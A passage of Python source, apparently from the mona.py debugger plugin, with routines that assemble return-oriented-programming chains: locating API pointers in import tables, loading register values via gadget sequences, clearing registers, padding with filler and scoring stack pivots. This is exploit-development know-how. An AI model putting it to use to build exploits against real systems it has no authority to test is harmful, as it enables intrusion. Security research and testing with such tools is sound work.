			base = 0
			top = TOP_USERLAND
			type = "instr"
			al = criteria["accesslevel"]
			criteria["accesslevel"] = "X"
			global ptr_to_get
			global ptr_counter
			ptr_counter = 0				
			ptr_to_get = 5
			theptr = 0
			global silent
			oldsilent = silent
			silent=True				
			allpointers = findPattern(modulecriteria,criteria,pattern,type,base,top)
			silent = oldsilent
			criteria["accesslevel"] = al
			thismodname = ""
			if len(allpointers) > 0:
				theptr = 0
				for ptrtype in allpointers:
					for ptrs in allpointers[ptrtype]:
						theptr = ptrs
						thismodname = MnPointer(theptr).belongsTo()
						break
			if theptr > 0:
				popptrtar = getShortestGadget(suggestions["pop "+targetreg])
				popptreax = getShortestGadget(suggestions["pop eax"])
				junksize = getJunk(interestinggadgets[popptrtar])-4
				pickupchain.append([popptrtar,"",junksize])
				pickupchain.append([theptr,"JMP [EAX] [" + thismodname + "]",0])
				junksize = getJunk(interestinggadgets[popptreax])-4
				pickupchain.append([popptreax,"",junksize])
				pickupchain.append([targetval,freetext,0])
				disablelist.append("eax")
				pickupfound = True	

		if not pickupfound:
			pickupchain.append([0,"[-] Unable to find gadgets to pickup the desired API pointer into " + targetreg,0])
			pickupchain.append([targetval,freetext,0])
		
	return pickupchain,disablelist
	
def getRopFuncPtr(apiname,modulecriteria,criteria,mode = "iat"):
	"""
	Will get a pointer to pointer to the given API name in the IAT of the selected modules
	
	Arguments :
	apiname : the name of the functino
	modulecriteria & criteria : module/pointer criteria
	
	Returns :
	a pointer (integer value, 0 if no pointer was found)
	text (with optional info)
	"""
	global silent
	oldsilent = silent
	silent = True
	global ptr_to_get
	ptr_to_get = -1	
	rfuncsearch = apiname.lower()
	
	
	ropfuncptr = 0
	ropfunctext = "ptr to &" + apiname + "()"
	
	if mode == "iat":
		
		ropfuncs,ropfuncoffsets = findROPFUNC(modulecriteria,criteria)
		silent = oldsilent
		#first look for good one
		for ropfunctypes in ropfuncs:
			if ropfunctypes.lower().find(rfuncsearch) > -1 and ropfunctypes.lower().find("rebased") == -1:
				ropfuncptr = ropfuncs[ropfunctypes][0]
				break
		if ropfuncptr == 0:
			for ropfunctypes in ropfuncs:
				if ropfunctypes.lower().find(rfuncsearch) > -1:
					ropfuncptr = ropfuncs[ropfunctypes][0]
					break
		#still haven't found ? clear out modulecriteria		
		if ropfuncptr == 0:
			oldsilent = silent
			silent = True
			limitedmodulecriteria = {}
			limitedmodulecriteria["os"] = True
			ropfuncs2,ropfuncoffsets2 = findROPFUNC(limitedmodulecriteria,criteria)
			silent = oldsilent
			for ropfunctypes in ropfuncs2:
				if ropfunctypes.lower().find(rfuncsearch) > -1 and ropfunctypes.lower().find("rebased") == -1:
					ropfuncptr = ropfuncs2[ropfunctypes][0]
					ropfunctext += " (skipped module criteria, check if pointer is reliable !)"
					break	
		
		if ropfuncptr == 0:
			ropfunctext = "[-] Unable to find ptr to &" + apiname+"()"
		else:
			ropfunctext += " [IAT " + MnPointer(ropfuncptr).belongsTo() + "]"
	else:
		# read EAT
		modulestosearch = getModulesToQuery(modulecriteria)
		for mod in modulestosearch:
			tmod = MnModule(mod)
			funcs = tmod.getEAT()
			for func in funcs:
				funcname = funcs[func].lower()
				if funcname.find(rfuncsearch) > -1:
					ropfuncptr = func
					break
		if ropfuncptr == 0:
			ropfunctext = "[-] Unable to find required API pointer"
	return ropfuncptr,ropfunctext

	
def putValueInReg(reg,value,freetext,suggestions,interestinggadgets,criteria):

	putchain = []
	allownull = True
	popptr = 0
	gadgetfound = False
	
	offset = 0
	if "+" in reg:
		offset = int(reg.split("+")[1],16) * (-1)
		reg = reg.split("+")[0]
	elif "-" in reg:
		offset = int(reg.split("-")[1],16)
		reg = reg.split("-")[0]
	
	if value != 0:	
		value = value + offset

	if value < 0:
		value = 0xffffffff + value + 1
		
	negvalue = 4294967296 - value
	
	ptrval = MnPointer(value)	
	
	if meetsCriteria(ptrval,criteria):
		# easy way - just pop it into a register
		for poptype in suggestions:
			if poptype.find("pop "+reg) == 0:
				popptr = getShortestGadget(suggestions[poptype])
				junksize = getJunk(interestinggadgets[popptr])-4
				putchain.append([popptr,"",junksize])
				putchain.append([value,freetext,0])
				gadgetfound = True
				break
		if not gadgetfound:
			# move
			for movetype in suggestions:
				if movetype.startswith("move") and movetype.endswith("-> " + reg):
					# get "from" reg
					fromreg = movetype.split(" ")[1].lower()
					for poptype in suggestions:
						if poptype.find("pop "+fromreg) == 0:
							popptr = getShortestGadget(suggestions[poptype])
							junksize = getJunk(interestinggadgets[popptr])-4
							putchain.append([popptr,"",junksize])
							putchain.append([value,freetext,0])
							moveptr = getShortestGadget(suggestions[movetype])
							movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
							for movesteps in movechain:
								putchain.append([movesteps[0],movesteps[1],movesteps[2]])
							gadgetfound = True
							break
					if gadgetfound:
						break
	if not gadgetfound or not meetsCriteria(ptrval,criteria):
		if meetsCriteria(MnPointer(negvalue),criteria):
			if "pop " + reg in suggestions and "neg "+reg in suggestions:
				popptr = getShortestGadget(suggestions["pop "+reg])
				junksize = getJunk(interestinggadgets[popptr])-4
				putchain.append([popptr,"",junksize])
				putchain.append([negvalue,"Value to negate, will become 0x" + toHex(value),0])
				negptr = getShortestGadget(suggestions["neg "+reg])
				junksize = getJunk(interestinggadgets[negptr])
				putchain.append([negptr,"",junksize])
				gadgetfound = True
			if not gadgetfound:
				for movetype in suggestions:
					if movetype.startswith("move") and movetype.endswith("-> " + reg):
						fromreg = movetype.split(" ")[1]
						if "pop " + fromreg in suggestions and "neg " + fromreg in suggestions:
							popptr = getShortestGadget(suggestions["pop "+fromreg])
							junksize = getJunk(interestinggadgets[popptr])-4
							putchain.append([popptr,"",junksize])
							putchain.append([negvalue,"Value to negate, will become 0x" + toHex(value)])
							negptr = getShortestGadget(suggestions["neg "+fromreg])
							junksize = getJunk(interestinggadgets[negptr])
							putchain.append([negptr,"",junksize])
							movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
							for movesteps in movechain:
								putchain.append([movesteps[0],movesteps[1],movesteps[2]])
							gadgetfound = True
							break
		else:
			if "pop " + reg in suggestions and "neg "+reg in suggestions and "dec "+reg in suggestions:
				toinc = 0
				while not meetsCriteria(MnPointer(negvalue-toinc),criteria):
					toinc += 1
					if toinc > 250:
						break
				if toinc <= 250:
					popptr = getShortestGadget(suggestions["pop "+reg])
					junksize = getJunk(interestinggadgets[popptr])-4
					putchain.append([popptr,"",junksize])
					putchain.append([negvalue-toinc,"Value to negate, destination value : 0x" + toHex(value),0])
					negptr = getShortestGadget(suggestions["neg "+reg])
					cnt = 0
					decptr = getShortestGadget(suggestions["dec "+reg])
					junksize = getJunk(interestinggadgets[negptr])
					putchain.append([negptr,"",junksize])
					junksize = getJunk(interestinggadgets[decptr])
					while cnt < toinc:
						putchain.append([decptr,"",junksize])
						cnt += 1
					gadgetfound = True
				
			if not gadgetfound:
				for movetype in suggestions:
					if movetype.startswith("move") and movetype.endswith("-> " + reg):
						fromreg = movetype.split(" ")[1]
						if "pop " + fromreg in suggestions and "neg " + fromreg in suggestions and "dec "+fromreg in suggestions:
							toinc = 0							
							while not meetsCriteria(MnPointer(negvalue-toinc),criteria):
								toinc += 1
								if toinc > 250:
									break
							if toinc <= 250:
								popptr = getShortestGadget(suggestions["pop "+fromreg])
								junksize = getJunk(interestinggadgets[popptr])-4
								putchain.append([popptr,"",junksize])
								putchain.append([negvalue-toinc,"Value to negate, destination value : 0x" + toHex(value),0])
								negptr = getShortestGadget(suggestions["neg "+fromreg])
								junksize = getJunk(interestinggadgets[negptr])
								cnt = 0
								decptr = getShortestGadget(suggestions["dec "+fromreg])
								putchain.append([negptr,"",junksize])
								junksize = getJunk(interestinggadgets[decptr])
								while cnt < toinc:
									putchain.append([decptr,"",junksize])
									cnt += 1
								movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
								for movesteps in movechain:
									putchain.append([movesteps[0],movesteps[1],movesteps[2]])
								gadgetfound = True
								break
							
			if not gadgetfound and "pop " + reg in suggestions and "neg "+reg in suggestions and "inc "+reg in suggestions:
				toinc = 0
				while not meetsCriteria(MnPointer(negvalue-toinc),criteria):
					toinc -= 1
					if toinc < -250:
						break
				if toinc > -250:
					popptr = getShortestGadget(suggestions["pop "+reg])
					junksize = getJunk(interestinggadgets[popptr])-4
					putchain.append([popptr,"",junksize])
					putchain.append([negvalue-toinc,"Value to negate, destination value : 0x" + toHex(value),0])
					negptr = getShortestGadget(suggestions["neg "+reg])
					junksize = getJunk(interestinggadgets[negptr])
					putchain.append([negptr,"",junksize])				
					incptr = getShortestGadget(suggestions["inc "+reg])
					junksize = getJunk(interestinggadgets[incptr])
					while toinc < 0:
						putchain.append([incptr,"",junksize])
						toinc += 1
					gadgetfound = True
				
			if not gadgetfound:
				for movetype in suggestions:
					if movetype.startswith("move") and movetype.endswith("-> " + reg):
						fromreg = movetype.split(" ")[1]
						if "pop " + fromreg in suggestions and "neg " + fromreg in suggestions and "inc "+fromreg in suggestions:
							toinc = 0							
							while not meetsCriteria(MnPointer(negvalue-toinc),criteria):
								toinc -= 1	
								if toinc < -250:
									break
							if toinc > -250:
								popptr = getShortestGadget(suggestions["pop "+fromreg])
								junksize = getJunk(interestinggadgets[popptr])-4
								putchain.append([popptr,""])
								putchain.append([negvalue-toinc,"Value to negate, destination value : 0x" + toHex(value)])
								negptr = getShortestGadget(suggestions["neg "+fromreg])
								junksize = getJunk(interestinggadgets[negptr])
								putchain.append([negptr,"",junksize])							
								decptr = getShortestGadget(suggestions["inc "+fromreg])
								junksize = getJunk(interestinggadgets[incptr])
								while toinc < 0 :
									putchain.append([incptr,"",junksize])
									toinc += 1
								movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
								for movesteps in movechain:
									putchain.append([movesteps[0],movesteps[1],movesteps[2]])
								gadgetfound = True
								break
							
		if not gadgetfound and "add value to " + reg in suggestions and "pop " + reg in suggestions:
			addtypes = ["ADD","ADC","XOR"]
			for addtype in addtypes:
				for ptrs in suggestions["add value to " + reg]:
					thisinstr = interestinggadgets[ptrs]
					thisparts = thisinstr.split("#")
					addinstr = thisparts[1].lstrip().split(",")
					if thisparts[1].startswith(addtype):
						if addtype == "ADD" or addtype == "ADC":
							addvalue = hexStrToInt(addinstr[1])
							delta = value - addvalue
							if delta < 0:
								delta = 0xffffffff + delta + 1
						if addtype == "XOR":
							delta = hexStrToInt(addinstr[1]) ^ value
						if meetsCriteria(MnPointer(delta),criteria):
							popptr = getShortestGadget(suggestions["pop "+reg])
							junksize = getJunk(interestinggadgets[popptr])-4
							putchain.append([popptr,"",junksize])
							putchain.append([delta,"Diff to desired value",0])
							junksize = getJunk(interestinggadgets[ptrs])
							putchain.append([ptrs,"",junksize])
							gadgetfound = True
							break
							
		if not gadgetfound:
			for movetype in suggestions:
				if movetype.startswith("move") and movetype.endswith("-> " + reg):
					fromreg = movetype.split(" ")[1]		
					if "add value to " + fromreg in suggestions and "pop " + fromreg in suggestions:
						addtypes = ["ADD","ADC","XOR"]
						for addtype in addtypes:
							for ptrs in suggestions["add value to " + fromreg]:
								thisinstr = interestinggadgets[ptrs]
								thisparts = thisinstr.split("#")
								addinstr = thisparts[1].lstrip().split(",")
								if thisparts[1].startswith(addtype):
									if addtype == "ADD" or addtype == "ADC":
										addvalue = hexStrToInt(addinstr[1])
										delta = value - addvalue
										if delta < 0:
											delta = 0xffffffff + delta + 1
									if addtype == "XOR":
										delta = hexStrToInt(addinstr[1]) ^ value
									#imm.log("0x%s : %s, delta : 0x%s" % (toHex(ptrs),thisinstr,toHex(delta)))
									if meetsCriteria(MnPointer(delta),criteria):
										popptr = getShortestGadget(suggestions["pop "+fromreg])
										junksize = getJunk(interestinggadgets[popptr])-4
										putchain.append([popptr,"",junksize])
										putchain.append([delta,"Diff to desired value",0])
										junksize = getJunk(interestinggadgets[ptrs])
										putchain.append([ptrs,"",junksize])
										movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
										for movesteps in movechain:
											putchain.append([movesteps[0],movesteps[1],movesteps[2]])
										gadgetfound = True
										break
		if not gadgetfound and "inc " + reg in suggestions and value <= 64:
			cnt = 0
			# can we clear the reg ?
			clearsteps = clearReg(reg,suggestions,interestinggadgets)
			for cstep in clearsteps:
				putchain.append([cstep[0],cstep[1],cstep[2]])			
			# inc
			incptr = getShortestGadget(suggestions["inc "+reg])
			junksize = getJunk(interestinggadgets[incptr])
			while cnt < value:
				putchain.append([incptr,"",junksize])
				cnt += 1
			gadgetfound = True
		if not gadgetfound:
			putchain.append([0,"[-] Unable to find gadget to put " + toHex(value) + " into " + reg,0])
	return putchain

def getGadgetMoveRegToReg(fromreg,toreg,suggestions,interestinggadgets):
	movechain = []
	movetype = "move " + fromreg + " -> " + toreg
	if movetype in suggestions:
		moveptr = getShortestGadget(suggestions[movetype])
		moveinstr = interestinggadgets[moveptr].lstrip()
		if moveinstr.startswith("# XOR") or moveinstr.startswith("# OR") or moveinstr.startswith("# AD"):
			clearchain = clearReg(toreg,suggestions,interestinggadgets)
			for cc in clearchain:
				movechain.append([cc[0],cc[1],cc[2]])
		junksize = getJunk(interestinggadgets[moveptr])		
		movechain.append([moveptr,"",junksize])
	else:
		movetype1 = "xor " + fromreg + " -> " + toreg
		movetype2 = "xor " + toreg + " -> " + fromreg
		if movetype1 in suggestions and movetype2 in suggestions:
			moveptr1 = getShortestGadget(suggestions[movetype1])
			junksize = getJunk(interestinggadgets[moveptr1])
			movechain.append([moveptr1,"",junksize])
			moveptr2 = getShortestGadget(suggestions[movetype2])
			junksize = getJunk(interestinggadgets[moveptr2])
			movechain.append([moveptr2,"",junksize])
	return movechain

def clearReg(reg,suggestions,interestinggadgets):
	clearchain = []
	clearfound = False
	if not "clear " + reg in suggestions:
		if not "inc " + reg in suggestions or not "pop " + reg in suggestions:
			# maybe it will work using a move from another register
			for inctype in suggestions:
				if inctype.startswith("inc"):
					increg = inctype.split(" ")[1]
					iptr = getShortestGadget(suggestions["inc " + increg])
					for movetype in suggestions:
						if movetype == "move " + increg + " -> " + reg and "pop " + increg in suggestions:
							moveptr = getShortestGadget(suggestions[movetype])
							moveinstr = interestinggadgets[moveptr].lstrip()
							if not(moveinstr.startswith("# XOR") or moveinstr.startswith("# OR") or moveinstr.startswith("# AD")):
								#kewl
								pptr = getShortestGadget(suggestions["pop " + increg])
								junksize = getJunk(interestinggadgets[pptr])-4
								clearchain.append([pptr,"",junksize])
								clearchain.append([0xffffffff," ",0])
								junksize = getJunk(interestinggadgets[iptr])
								clearchain.append([iptr,"",junksize])
								junksize = getJunk(interestinggadgets[moveptr])
								clearchain.append([moveptr,"",junksize])
								clearfound = True
								break
			if not clearfound:				
				clearchain.append([0,"[-] Unable to find a gadget to clear " + reg,0])
		else:
			#pop FFFFFFFF into reg, then do inc reg => 0
			pptr = getShortestGadget(suggestions["pop " + reg])
			junksize = getJunk(interestinggadgets[pptr])-4
			clearchain.append([pptr,"",junksize])
			clearchain.append([0xffffffff," ",0])
			iptr = getShortestGadget(suggestions["inc " + reg])
			junksize = getJunk(interestinggadgets[iptr])
			clearchain.append([iptr,"",junksize])
	else:
		shortest_clear = getShortestGadget("clear " + reg)
		junksize = getJunk(interestinggadgets[shortest_clear])
		clearchain.append([shortest_clear,"",junksize])
	return clearchain
	
def getGadgetValueToReg(reg,value,suggestions,interestinggadgets):
	negfound = False
	blocktxt = ""
	blocktxt2 = ""	
	tonegate = 4294967296 - value
	nregs = ["eax","ebx","ecx","edx","edi"]
	junksize = 0
	junk2size = 0
	negateline = "\t\t\t0x" + toHex(tonegate)+",\t# value to negate, target value : 0x" + toHex(value) + ", target reg : " + reg +"\n"
	if "neg " + reg in suggestions:
		negfound = True
		negptr = getShortestGadget(suggestions["neg " + reg])
		if "pop "+reg in suggestions:
			pptr = getShortestGadget(suggestions["pop " + reg])
			blocktxt2 += "\t\t\t0x" + toHex(pptr)+",\t"+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"					
			blocktxt2 += negateline
			junk2size = getJunk(interestinggadgets[pptr])-4
		else:
			blocktxt2 += "\t\t\t0x????????,#\tfind a way to pop the next value into "+thisreg+"\n"					
			blocktxt2 += negateline			
		blocktxt2 += "\t\t\t0x" + toHex(negptr)+",\t"+interestinggadgets[negptr].strip()+" ("+MnPointer(negptr).belongsTo()+")\n"
		junksize = getJunk(interestinggadgets[negptr])-4
		
	if not negfound:
		nregs.remove(reg)
		for thisreg in nregs:
			if "neg "+ thisreg in suggestions and not negfound:
				blocktxt2 = ""
				junk2size = 0
				negfound = True
				#get pop first
				if "pop "+thisreg in suggestions:
					pptr = getShortestGadget(suggestions["pop " + thisreg])
					blocktxt2 += "\t\t\t0x" + toHex(pptr)+",\t"+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"					
					blocktxt2 += negateline
					junk2size = getJunk(interestinggadgets[pptr])-4
				else:
					blocktxt2 += "\t\t\t0x????????,#\tfind a way to pop the next value into "+thisreg+"\n"					
					blocktxt2 += negateline				
				negptr = getShortestGadget(suggestions["neg " + thisreg])
				blocktxt2 += "\t\t\t0x" + toHex(negptr)+",\t"+interestinggadgets[negptr].strip()+" ("+MnPointer(negptr).belongsTo()+")\n"
				junk2size = junk2size + getJunk(interestinggadgets[negptr])-4				
				#now move it to reg
				if "move " + thisreg + " -> " + reg in suggestions:
					bptr = getShortestGadget(suggestions["move " + thisreg + " -> " + reg])
					if interestinggadgets[bptr].strip().startswith("# ADD"):
						if not "clear " + reg in suggestions:
							# other way to clear reg, using pop + inc ?
							if not "inc " + reg in suggestions or not "pop " + reg in suggestions:
								blocktxt2 += "\t\t\t0x????????,\t# find pointer to clear " + reg+"\n"
							else:
								#pop FFFFFFFF into reg, then do inc reg => 0
								pptr = getShortestGadget(suggestions["pop " + reg])
								blocktxt2 += "\t\t\t0x" + toHex(pptr)+",\t"+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"
								blocktxt2 += "\t\t\t0xffffffff,\t# pop value into " + reg + "\n"
								blocktxt2 += createJunk(getJunk(interestinggadgets[pptr])-4)
								iptr = getShortestGadget(suggestions["inc " + reg])
								blocktxt2 += "\t\t\t0x" + toHex(iptr)+",\t"+interestinggadgets[iptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"								
								junksize += getJunk(interestinggadgets[iptr])
						else:
							clearptr = getShortestGadget(suggestions["empty " + reg])
							blocktxt2 += "\t\t\t0x" + toHex(clearptr)+",\t"+interestinggadgets[clearptr].strip()+" ("+MnPointer(clearptr).belongsTo()+")\n"	
							junk2size = junk2size + getJunk(interestinggadgets[clearptr])-4
					blocktxt2 += "\t\t\t0x" + toHex(bptr)+",\t"+interestinggadgets[bptr].strip()+" ("+MnPointer(bptr).belongsTo()+")\n"
					junk2size = junk2size + getJunk(interestinggadgets[bptr])-4
				else:
					negfound = False
	if negfound: 
		blocktxt += blocktxt2
	else:
		blocktxt = ""
	junksize = junksize + junk2size
	return blocktxt,junksize

def getOffset(instructions):
	offset = 0
	instrparts = instructions.split("#")
	retpart = instrparts[len(instrparts)-1].strip()
	retparts = retpart.split(" ")
	if len(retparts) > 1:
		offset = hexStrToInt(retparts[1])
	return offset
	
def getJunk(instructions):
	junkpop = instructions.count("POP ") * 4
	junkpush = instructions.count("PUSH ") * -4
	junkpushad = instructions.count("PUSHAD ") * -32
	junkpopad = instructions.count("POPAD") * 32
	junkinc = instructions.count("INC ESP") * 1
	junkdec = instructions.count("DEC ESP") * -1
	junkesp = 0
	if instructions.find("ADD ESP,") > -1:
		instparts = instructions.split("#")
		for part in instparts:
			thisinstr = part.strip()
			if thisinstr.startswith("ADD ESP,"):
				value = thisinstr.split(",")
				junkesp += hexStrToInt(value[1])
	if instructions.find("SUB ESP,") > -1:
		instparts = instructions.split("#")
		for part in instparts:
			thisinstr = part.strip()
			if thisinstr.startswith("SUB ESP,"):
				value = thisinstr.split(",")
				junkesp -= hexStrToInt(value[1])
	junk = junkpop + junkpush + junkpopad + junkpushad + junkesp
	return junk

def createJunk(size,message="filler (compensate)",alignsize=0):
	bytecnt = 0
	dword = 0
	junktxt = ""
	while bytecnt < size:
		dword = 0
		junktxt += "\t\t\t0x"
		while dword < 4 and bytecnt < size :
			junktxt += "41"
			dword += 1
			bytecnt += 1
		junktxt += ","
		junktxt += toSize("",alignsize + 4 - dword)
		junktxt += "\t# "+message+"\n"
	return junktxt

	
def getShortestGadget(chaintypedict):
	shortest = 100
	shortestptr = 0
	shortestinstr = "A" * 1000
	thischaindict = chaintypedict.copy()
	#shuffle dict so returning ptrs would be different each time
	while thischaindict:
		typeptr, thisinstr = random.choice(thischaindict.items())
		if thisinstr.startswith("# XOR") or thisinstr.startswith("# OR") or thisinstr.startswith("# AD"):
			thisinstr += "     "	# make sure we don prefer MOV or XCHG
		thiscount = thisinstr.count("#")
		thischaindict.pop(typeptr)
		if thiscount < shortest:
			shortest = thiscount
			shortestptr = typeptr
			shortestinstr = thisinstr
		else:
			if thiscount == shortest:
				if len(thisinstr) < len(shortestinstr):
					shortest = thiscount
					shortestptr = typeptr
					shortestinstr = thisinstr
	return shortestptr

def isInterestingGadget(instructions):
	interesting =	[
					"POP E", "XCHG E", "LEA E", "PUSH E", "XOR E", "AND E", "NEG E", 
					"OR E", "ADD E", "SUB E", "INC E", "DEC E", "POPAD", "PUSHAD",
					"SUB A", "ADD A", "NOP", "ADC E",
					"SUB BH", "SUB BL", "ADD BH", "ADD BL", 
					"SUB CH", "SUB CL", "ADD CH", "ADD CL",
					"SUB DH", "SUB DL", "ADD DH", "ADD DL",
					"MOV E", "CLC", "CLD", "FS:", "FPA"
					]
	notinteresting = [ "MOV ESP,EBP", "LEA ESP"	]
	regs = immlib.Registers32BitsOrder
	individual = instructions.split("#")
	cnt = 0
	allgood = True
	toskip = False
	while (cnt < len(individual)-1) and allgood:	# do not check last one, which is the ending instruction
		thisinstr = individual[cnt].strip().upper()
		if thisinstr != "":
			toskip = False
			foundinstruction = False
			for notinterest in notinteresting:
				if thisinstr.find(notinterest) > -1:
					toskip= True 
			if not toskip:
				for interest in interesting:
					if thisinstr.find(interest) > -1:
						foundinstruction = True
				if not foundinstruction:
					#check the conditional instructions
					if thisinstr.find("MOV DWORD PTR DS:[E") > -1:
						thisinstrparts = thisinstr.split(",")
						if len(thisinstrparts) > 1:
							if thisinstrparts[1] in regs:
								foundinstruction = True
				allgood = foundinstruction
			else:
				allgood = False
		cnt += 1
	return allgood
	
def isInterestingJopGadget(instructions):
	interesting =	[
					"POP E", "XCHG E", "LEA E", "PUSH E", "XOR E", "AND E", "NEG E", 
					"OR E", "ADD E", "SUB E", "INC E", "DEC E", "POPAD", "PUSHAD",
					"SUB A", "ADD A", "NOP", "ADC E",
					"SUB BH", "SUB BL", "ADD BH", "ADD BL", 
					"SUB CH", "SUB CL", "ADD CH", "ADD CL",
					"SUB DH", "SUB DL", "ADD DH", "ADD DL",
					"MOV E", "CLC", "CLD", "FS:", "FPA"
					]
	notinteresting = [ "MOV ESP,EBP", "LEA ESP"	]
	regs = immlib.Registers32BitsOrder
	individual = instructions.split("#")
	cnt = 0
	allgood = True
	popfound = False
	toskip = False
	# what is the jmp instruction ?
	lastinstruction = individual[len(individual)-1].replace("[","").replace("+"," ").replace("]","").strip()
	
	jmp = lastinstruction.split(' ')[1].strip().upper().replace(" ","")
	
	regs = ["EAX","EBX","ECX","EDX","ESI","EDI","EBP","ESP"]
	regs.remove(jmp)
	if jmp != "ESP":
		if instructions.find("POP "+jmp) > -1:
			popfound=True
		else:
			for reg in regs:
				poploc = instructions.find("POP "+reg)
				if (poploc > -1):
					if (instructions.find("MOV "+reg+","+jmp) > poploc) or (instructions.find("XCHG "+reg+","+jmp) > poploc) or (instructions.find("XCHG "+jmp+","+reg) > poploc):
						popfound = True
		allgood = popfound
	return allgood

def readGadgetsFromFile(filename):
	"""
	Reads a mona/msf generated rop file 
	
	Arguments :
	filename - the full path + filename of the source file
	
	Return :
	dictionary containing the gadgets (grouped by ending type)
	"""
	
	readopcodes = {}
	
	srcfile = open(filename,"rb")
	content = srcfile.readlines()
	srcfile.close()
	msffiledetected = False
	#what kind of file do we have
	for thisLine in content:
		if thisLine.find("mod:") > -1 and thisLine.find("ver:") > -1 and thisLine.find("VA") > -1:
			msffiledetected = True
			break
	if msffiledetected:
		imm.log("[+] Importing MSF ROP file...")
		addrline = 0
		ending = ""
		thisinstr = ""
		thisptr = ""
		for thisLine in content:
			if thisLine.find("[addr:") == 0:
				thisLineparts = thisLine.split("]")
				if addrline == 0:	
					thisptr = hexStrToInt(thisLineparts[0].replace("[addr: ",""))
				thisLineparts = thisLine.split("\t")
				thisinstrpart = thisLineparts[len(thisLineparts)-1].upper().strip()
				if thisinstrpart != "":
					thisinstr += " # " + thisinstrpart
					ending = thisinstrpart
				addrline += 1
			else:
				addrline = 0
				if thisptr != "" and ending != "" and thisinstr != "":
					if not ending in readopcodes:
						readopcodes[ending] = [thisptr,thisinstr]
					else:
						readopcodes[ending] += ([thisptr,thisinstr])
				thisptr = ""
				ending = ""
				thisinstr = ""
		
	else:
		imm.log("[+] Importing Mona legacy ROP file...")
		for thisLine in content:
			refpointer,instr = splitToPtrInstr(thisLine)
			if refpointer != -1:
				#get ending
				instrparts = instr.split("#")
				ending = instrparts[len(instrparts)-1]
				if not ending in readopcodes:
					readopcodes[ending] = [refpointer,instr]
				else:
					readopcodes[ending] += ([refpointer,instr])
	return readopcodes
	
def isGoodGadgetPtr(gadget,criteria):
	gadgetptr = MnPointer(gadget)
	if meetsCriteria(gadgetptr,criteria):
		#do additional checks
		return True
	else:
		return False
		
def getStackPivotDistance(gadget,distance=0):
	allgadgets = gadget.split(" # ")
	offset = 0
	gadgets = []
	splitter = re.compile(",")
	mindistance = 0
	maxdistance = 0
	distanceparts = splitter.split(str(distance))
	if len(distanceparts) == 1:
		maxdistance = 99999999
		if str(distance).lower().startswith("0x"):
			mindistance = hexStrToInt(mindistance)
		else:
			mindistance = int(distance)
	else:
		mindistance = distanceparts[0]
		maxdistance = distanceparts[1]
		if str(mindistance).lower().startswith("0x"):
			mindistance = hexStrToInt(mindistance)
		else:
			mindistance = int(distanceparts[0])
		if str(maxdistance).lower().startswith("0x"):
			maxdistance = hexStrToInt(maxdistance)
		else:
			maxdistance = int(distanceparts[1])
	for thisgadget in allgadgets:
		if thisgadget.strip() != "":
			gadgets.append(thisgadget.strip())
	if len(gadgets) > 1:
		# calculate the entire distance
		for g in gadgets:
			if g.find("POP") == 0 or g.find("ADD ESP,") == 0 or g.find("PUSH") == 0 or g.find("RET") == 0 or g.find("SUB ESP,") == 0 or g.find("INC ESP") == 0 or g.find("DEC ESP") == 0:
				if g.strip().find("ADD ESP,") == 0:
					parts = g.split(",")
					try:
						offset += hexStrToInt(parts[1])
					except:
						pass
				if g.strip().find("SUB ESP,") == 0:
					parts = g.split(",")
					try:
						offset -= hexStrToInt(parts[1])
					except:
						pass
				if g.strip().find("INC ESP") == 0:
					offset += 1
				if g.strip().find("DEC ESP") == 0:
					offset -= 1					
				if g.strip().find("POP ") == 0:
					offset += 4
				if g.strip().find("PUSH ") == 0:
					offset -= 4
				if g.strip().find("POPAD") == 0:
					offset += 32
				if g.strip().find("PUSHAD") == 0:
					offset -= 32
			else:
				if (g.find("DWORD PTR") > 0 or g.find("[") > 0) and not g.find("FS") > 0:
					return 0
	if mindistance <= offset and offset <= maxdistance:
		return offset
	return 0
		
def isGoodGadgetInstr(instruction):
	forbidden = [
				"???", "LEAVE", "JMP ", "CALL ", "JB ", "JL ", "JE ", "JNZ ", 
				"JGE ", "JNS ","SAL ", "LOOP", "LOCK", "BOUND", "SAR", "IN ", 
				"OUT ", "RCL", "RCR", "ROL", "ROR", "SHL", "SHR", "INT", "JECX",
				"JNP", "JPO", "JPE", "JCXZ", "JA", "JB", "JNA", "JNB", "JC", "JNC",
				"JG", "JLE", "MOVS", "CMPS", "SCAS", "LODS", "STOS", "REP", "REPE",
				"REPZ", "REPNE", "REPNZ", "LDS", "FST", "FIST", "FMUL", "FDIVR",
				"FSTP", "FST", "FLD", "FDIV", "FXCH", "JS ", "FIDIVR", "SBB",
				"SALC", "ENTER", "CWDE", "FCOM", "LAHF", "DIV", "JO", "OUT", "IRET",
				"FILD", "RETF","HALT","HLT","AAM","FINIT","INT3"
				]
	for instr in forbidden:
		if instruction.upper().find(instr) > -1:
			return False
	return True
	
def isGoodJopGadgetInstr(instruction):
	forbidden = [
				"???", "LEAVE", "RETN", "CALL ", "JB ", "JL ", "JE ", "JNZ ", 
				"JGE ", "JNS ","SAL ", "LOOP", "LOCK", "BOUND", "SAR", "IN ", 
				"OUT ", "RCL", "RCR", "ROL", "ROR", "SHL", "SHR", "INT", "JECX",
				"JNP", "JPO", "JPE", "JCXZ", "JA", "JB", "JNA", "JNB", "JC", "JNC",
				"JG", "JLE", "MOVS", "CMPS", "SCAS", "LODS", "STOS", "REP", "REPE",
				"REPZ", "REPNE", "REPNZ", "LDS", "FST", "FIST", "FMUL", "FDIVR",
				"FSTP", "FST", "FLD", "FDIV", "FXCH", "JS ", "FIDIVR", "SBB",
				"SALC", "ENTER", "CWDE", "FCOM", "LAHF", "DIV", "JO", "OUT", "IRET",
				"FILD", "RETF","HALT","HLT","AAM","FINIT"
				]
	for instr in forbidden:
		if instruction.upper().find(instr) > -1:
			return False
	return True	

def isGadgetEnding(instruction,endings,verbosity=False):
	endingfound=False
	for ending in endings:
		if instruction.lower().find(ending.lower()) > -1:
			endingfound = True
	return endingfound

def getRopSuggestion(ropchains,allchains):
	suggestions={}
	# pushad
	# ======================
